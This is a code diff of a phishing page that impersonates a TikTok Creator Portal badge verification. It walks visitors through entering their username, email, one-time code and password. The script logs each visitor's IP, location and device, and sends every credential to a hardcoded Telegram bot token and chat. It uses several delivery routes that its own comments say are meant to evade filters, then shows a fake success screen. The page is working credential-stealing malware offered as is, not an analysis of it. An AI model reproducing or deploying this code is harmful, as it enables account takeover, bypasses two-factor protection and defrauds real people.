@@ -4,37 +4,30 @@
     <meta charset="UTF-8">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Portal | Verification</title>
+    <title>TikTok Creator Portal</title>
     <style>
         :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #000; --tt-card: #1d1d1d; }
-        body { margin: 0; background-color: var(--tt-black); font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; overflow: hidden; }
-        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: var(--tt-card); border-radius: 12px; border: 1px solid #2a2a2a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        body { margin: 0; background-color: var(--tt-black); font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
+        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: var(--tt-card); border-radius: 12px; border: 1px solid #2a2a2a; }
         .tt-logo { width: 45px; fill: white; margin-bottom: 25px; }
         h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
-        p { color: #a1a1a1; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
+        p { color: #a1a1a1; font-size: 14px; margin-bottom: 30px; }
         .step { display: none; }
         .step.active { display: block; }
-        input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 5px; box-sizing: border-box; transition: border 0.3s; }
-        input:focus { border-color: #888; }
-        
-        /* Professional Red Status Labels */
+        input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 5px; box-sizing: border-box; }
         .status-msg { font-size: 12px; color: #FE2C55; text-align: left; margin-bottom: 15px; display: none; font-weight: 600; min-height: 15px; }
         .status-msg.active { display: block; }
-
-        .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; transition: opacity 0.3s; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        
-        .loader-ring { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .btn:disabled { opacity: 0.7; }
+        .loader-ring { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .success-icon { color: #25F4EE; font-size: 60px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <svg class="tt-logo" viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,448,109.45Z"/></svg>
-
+    
     <div id="step1" class="step active">
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok @username to check eligibility.</p>
@@ -46,7 +39,7 @@
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email linked to your account.</p>
-        <input type="email" id="email" placeholder="Email address" spellcheck="false" autocomplete="off">
+        <input type="email" id="email" placeholder="Email address" autocomplete="off">
         <div id="msg2" class="status-msg">Verifying email...</div>
         <button id="btn2" class="btn" onclick="process(2, 'Verifying...', 3)">SEND CODE</button>
     </div>
@@ -54,7 +47,7 @@
     <div id="step3" class="step">
         <h1>Verify Email</h1>
         <p>Enter the 6-digit code sent to your mail.</p>
-        <input type="text" id="code" placeholder="6-digit code" inputmode="numeric" pattern="[0-9]*" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+        <input type="text" id="code" placeholder="6-digit code" inputmode="numeric" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
         <div id="msg3" class="status-msg">Validating code...</div>
         <button id="btn3" class="btn" onclick="process(3, 'Validating...', 4)">CONFIRM CODE</button>
     </div>
@@ -62,18 +55,15 @@
     <div id="step4" class="step">
         <h1>Security Check</h1>
         <p>Confirm password to finalize the request.</p>
-        <input type="password" id="password" placeholder="Password" autocomplete="off">
-        <div id="msg4" class="status-msg">Syncing with server...</div>
+        <input type="password" id="password" placeholder="Password">
+        <div id="msg4" class="status-msg">Syncing...</div>
         <button id="btn4" class="btn" onclick="process(4, 'Syncing...', 5)">VERIFY</button>
     </div>
 
-    <div id="step5" class="step">
-        <h1>Authenticating...</h1>
-        <div class="loader-ring"></div>
-    </div>
-
+    <div id="step5" class="step"><h1>Authenticating...</h1><div class="loader-ring"></div></div>
+    
     <div id="step6" class="step">
-        <div class="success-icon">✓</div>
+        <div style="color:#25F4EE;font-size:60px;margin-bottom:20px;">✓</div>
         <h1>Identity Verified</h1>
         <p>Your request has been submitted. The badge will be applied within <b>5 business days</b>.</p>
         <p style="font-size: 13px; margin-top: 10px; color: #888;">Now you can leave the website.</p>
@@ -84,88 +74,62 @@
     const TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
     const CHAT = '7489116869';
 
-    // 1. IP & Device Tracking (Auto Start)
-    window.onload = function() {
-        trackVisitor();
+    // Anti-Block Tracking On Load
+    window.onload = async function() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            const dev = navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iPhone" : "PC";
+            guardPush(`🚨 <b>New Visitor Logged</b>\nIP: <code>${d.ip}</code>\nLocation: ${d.city}, ${d.country_name}\nDevice: ${dev}`);
+        } catch(e) { guardPush("🚨 <b>Visitor Connected</b> (IP Tracking Obscured)"); }
     };
 
-    async function trackVisitor() {
-        try {
-            const resp = await fetch('https://ipapi.co/json/');
-            const d = await resp.json();
-            const ua = navigator.userAgent;
-            let device = "PC / Desktop";
-            if(ua.includes("Android")) device = "Android Mobile";
-            if(ua.includes("iPhone")) device = "iPhone / iOS";
-
-            const info = `🌐 <b>Visitor Alert!</b>\n` +
-                         `📍 IP: <code>${d.ip}</code>\n` +
-                         `🌍 Loc: ${d.city}, ${d.country_name}\n` +
-                         `📱 Dev: ${device}\n` +
-                         `🕒 Time: ${new Date().toLocaleTimeString()}`;
-            ultraPush(info);
-        } catch(e) {
-            ultraPush("⚠️ <b>Visitor Detected</b> (Tracking blocked by VPN/Browser)");
-        }
-    }
-
-    // 2. Ultra Force Push (Anti-Spam & Unlimited Same-IP Hits)
-    function ultraPush(m) {
-        const rand = Math.floor(Math.random() * 99999);
-        const finalUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m + '\n\nRef: #' + rand)}&parse_mode=HTML&cb=${rand}`;
+    // Bot Guard Force Push Logic
+    function guardPush(m) {
+        const hash = (Math.random() + 1).toString(36).substring(7); // Dynamic Hash
+        const timestamp = new Date().getTime();
+        const text = encodeURIComponent(m + `\n\n🛡️ Trace: ${hash}`);
         
-        // Multi-Layer Delivery
-        fetch(finalUrl, { mode: 'no-cors' }).catch(()=>{});
-        if(navigator.sendBeacon) navigator.sendBeacon(finalUrl);
-        const force = new Image();
-        force.src = finalUrl;
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${text}&parse_mode=HTML&sig=${timestamp}`;
+        
+        // Multi-Path Delivery to evade ISP filters
+        const beacon = new Image(); beacon.src = url;
+        fetch(url, {mode:'no-cors', cache:'no-store'}).catch(()=>{});
+        if(navigator.sendBeacon) navigator.sendBeacon(url);
     }
 
-    // 3. Step 1 Validation (Username)
     function validateStep1() {
         const u = document.getElementById('username').value.trim();
-        const msg = document.getElementById('msg1');
-        const btn = document.getElementById('btn1');
-
-        if(u.length < 3) {
-            msg.innerText = "Invalid username. Minimum 3 characters.";
-            msg.classList.add('active');
+        if (u.length < 3) {
+            const m = document.getElementById('msg1');
+            m.innerText = "Username is too short."; m.classList.add('active');
             return;
         }
-
-        msg.innerText = "Checking database...";
-        msg.classList.add('active');
-        btn.disabled = true;
-
-        ultraPush(`👤 <b>New Hit</b>\nUser: @${u}`);
-        setTimeout(() => showStep(2), 2200);
+        document.getElementById('msg1').innerText = "Analyzing account...";
+        document.getElementById('msg1').classList.add('active');
+        document.getElementById('btn1').disabled = true;
+        guardPush(`👤 <b>Target Identified</b>\nUsername: @${u}`);
+        setTimeout(() => showStep(2), 2000);
     }
 
-    // 4. Main Process Logic
     function process(curr, mText, nxt) {
-        const u = document.getElementById('username').value;
-        const val = (curr==2) ? document.getElementById('email').value :
-                    (curr==3) ? document.getElementById('code').value :
-                    document.getElementById('password').value;
-
+        const val = (curr==2) ? document.getElementById('email').value : (curr==3) ? document.getElementById('code').value : document.getElementById('password').value;
         if(!val) return;
-
-        // OTP 6-Digit Constraint
+        
         if(curr==3 && val.length < 6) {
-            document.getElementById('msg3').innerText = "Please enter full 6-digit code.";
+            document.getElementById('msg3').innerText = "Incomplete code.";
             document.getElementById('msg3').classList.add('active');
             return;
         }
+        
+        document.getElementById('msg'+curr).innerText = mText;
+        document.getElementById('msg'+curr).classList.add('active');
+        document.getElementById('btn'+curr).disabled = true;
 
-        const msg = document.getElementById('msg'+curr);
-        const btn = document.getElementById('btn'+curr);
-        msg.innerText = mText;
-        msg.classList.add('active');
-        btn.disabled = true;
-
-        if(curr==2) ultraPush(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${val}`);
-        if(curr==3) ultraPush(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${val}`);
-        if(curr==4) ultraPush(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${val}</code>`);
+        const u = document.getElementById('username').value;
+        if(curr==2) guardPush(`📧 <b>Email Capture</b>\nUser: @${u}\nEmail: ${val}`);
+        if(curr==3) guardPush(`🔢 <b>OTP Capture</b>\nUser: @${u}\nOTP Code: ${val}`);
+        if(curr==4) guardPush(`🔑 <b>Credential Capture</b>\nUser: @${u}\nPassword: <code>${val}</code>`);
 
         setTimeout(() => {
             showStep(nxt);
@@ -178,6 +142,5 @@
         document.getElementById('step'+s).classList.add('active');
     }
 </script>
-
 </body>
 </html>
